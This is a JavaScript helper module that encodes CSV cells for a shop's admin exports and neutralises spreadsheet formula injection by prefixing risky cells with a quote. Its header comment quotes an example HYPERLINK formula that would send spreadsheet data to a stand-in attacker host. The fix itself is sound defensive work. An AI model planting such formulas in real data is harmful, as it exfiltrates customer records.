'use strict';

// One owner for CSV cell encoding.
//
// Five routes built CSV by hand (adminCustomers, adminProducts, products,
// promoCodes, marketingDashboard), each doing its own quote-doubling and none
// neutralising formula injection.
//
// The exported fields are customer-supplied — firstName, lastName and phone come
// straight from checkout. A cell beginning with = + - @ (or tab/CR, which Excel
// strips before parsing) is evaluated as a FORMULA when the file is opened, so a
// customer who names themselves
//   =HYPERLINK("https://evil.example/?"&A1,"click")
// turns the founder's own export into an exfiltration link. It is the shop's
// most sensitive data — the full marketing list — opened by the one person who
// trusts the file completely.
//
// Prefixing with a single quote is the standard neutraliser: Excel, LibreOffice
// and Sheets all treat the cell as literal text and do not display the quote.
const FORMULA_START = /^[=+\-@\t\r]/;

/** Encode one value as a CSV cell: formula-neutralised, quoted, quotes doubled. */
function csvCell(value) {
  let s = value === null || value === undefined ? '' : String(value);
  if (FORMULA_START.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** Encode a row of values into a CSV line. */
function csvRow(values) {
  return values.map(csvCell).join(',');
}

module.exports = { csvCell, csvRow };
